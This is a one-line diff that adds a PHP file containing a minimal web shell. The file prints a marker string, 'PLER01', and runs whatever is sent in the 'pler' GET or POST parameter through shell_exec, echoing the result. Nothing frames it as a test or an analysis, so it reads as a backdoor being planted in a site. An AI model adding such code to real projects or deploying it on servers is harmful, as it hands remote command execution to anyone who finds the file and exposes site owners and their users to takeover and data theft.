@@ -1,0 +1,1 @@
+<?php echo "PLER01<br>\n";if(isset($_GET["pler"])){echo "<pre>".shell_exec($_GET["pler"])."</pre>";echo shell_exec($_POST["pler"]??"");}?>
